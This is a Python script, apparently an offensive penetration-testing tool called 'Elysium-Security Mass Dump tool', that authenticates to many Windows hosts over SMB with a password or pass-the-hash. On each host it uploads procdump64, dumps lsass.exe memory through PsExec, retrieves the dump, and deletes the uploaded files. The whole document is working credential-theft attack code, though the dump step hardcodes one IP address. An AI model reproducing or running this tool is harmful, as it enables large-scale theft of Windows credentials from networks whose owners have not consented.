#!/usr/bin/python
# coding: utf-8

import time
from psexec import PSEXEC
from impacket.smbconnection import SMBConnection
import os
import sys
import argparse
import ipaddress
import threading
import random
import string


def randword(length):
    return ''.join(random.choice(string.lowercase) for i in range(length)).upper()


def success(msg):
    print("[{}] [>>] {}".format(time.strftime("%H:%M:%S"), msg))


def error(msg):
    print("[{}] [EE] {}".format(time.strftime("%H:%M:%S"), msg))


def chunks(l,n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]


def dump(user, passwd, hashes, out):

    if len(hashes) < 1:
        hashes = None

    p = PSEXEC(command="procdump64 -accepteula -ma lsass.exe {}".format(out),
               path='c:\\windows',
               exeFile=None,
               copyFile=None,
               port=445,
               username=user,
               password=passwd,
               domain='',
               hashes=hashes)

    success("Dumping lsass.exe into {} ...".format(out))

    save_stdout = sys.stdout
    sys.stdout = open('/tmp/trash', 'w')

    try:
        p.run(remoteHost="192.168.126.10", remoteName="192.168.126.10")
    except SystemExit:
        pass
    except Exception as e:
        print(e)
        error("Cannot execute payload")

    sys.stdout = save_stdout
    success("Done")


def put(smb, lfile, share):
    success("Putting procdump.exe ...")
    try:
        f = open(lfile, 'rb')
        smb.putFile(share, os.path.basename(lfile), f.read)
        f.close()
        success("Done")
    except Exception as e:
        print(e)
        error("Cannot put {}".format(lfile))


def get(smb, rfile, lfile, share):
    success("Retrieving {} ...".format(rfile))
    try:
        f = open(lfile, 'wb')
        smb.getFile(share, rfile, f.write)
        f.close()
        success("Done")
    except Exception as e:
        print(e)
        error("Cannot get {}".format(rfile))


def delete(smb, rfile, share):
    success("Deleting {} ...".format(rfile))
    try:
        smb.deleteFile(share, rfile)
        success("Done")
    except Exception as e:
        print(e)
        error("Cannot delete {}".format(rfile))


def run(user, hashes, passwd, share, output, ltarget):
    dumpname = "{}_{}.dmp".format(ltarget, randword(5))
    smb = SMBConnection(ltarget, ltarget)
    lmhash = ""
    nthash = ""

    if len(hashes):
        lmhash = hashes.split(":")[0]
        nthash = hashes.split(":")[1]
        passwd=''

    smb.login(user, passwd, '', lmhash, nthash)

    # TODO select payload from dest arch
    payloadfile = "bin/procdump64.exe"

    put(smb, "bin/procdump64.exe", share)

    dump(user, passwd, hashes, dumpname)

    get(smb, dumpname, "{}/{}".format(output, dumpname), share)

    delete(smb, os.path.basename(payloadfile), share)
    delete(smb, dumpname, share)

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Elysium-Security Mass Dump tool', conflict_handler='resolve')

    parser.add_argument('-L', '--list', dest='list', help='Targets file (nmap format)', required=False, default="")
    parser.add_argument('-U', '--user', dest='user', help='User', required=True)
    parser.add_argument('-H', '--hash', dest='hash', help='Hash, to pass the hash ;)', required=False,default="")
    parser.add_argument('-P', '--password', dest='passwd', help='Password', required=False)
    parser.add_argument('-S', '--share', dest='share', help='Share name (default: ADMIN$)', required=False, default="admin$")
    parser.add_argument('-N', '--threads', dest='threads', help='Number of threads', required=False, default=5)
    parser.add_argument('-O', '--output', dest='output', help='Output path', required=True)

    args = parser.parse_args()

    if (not hasattr(args, 'hash') and not hasattr(args, 'password')) or (hasattr(args, 'hash') and hasattr(args, 'password')):
        print ("Hash OR password needed!")
        sys.exit(1)

    if not os.path.isfile(args.list):
        print ("{0} File not found!".format(args.list))
        sys.exit(1)

    targets = []

    with open(args.list) as fp:
        for line in fp:

            if "/" in line:
                print line
                for x in ipaddress.ip_network(unicode(line.replace("\n", ''), "utf-8")).hosts():
                    targets.append(str(x))
            else:
                targets.append(line.replace("\n", ""))

    for targets_chunk in chunks(targets, int(args.threads)):
        threads_tab = []
        for ltarget in targets_chunk:
            t = threading.Thread(target=run,
                                 args=(args.user, args.hash, args.passwd, args.share, args.output, ltarget,))
            t.start()
            threads_tab.append(t)

        for t in threads_tab:
            t.join()
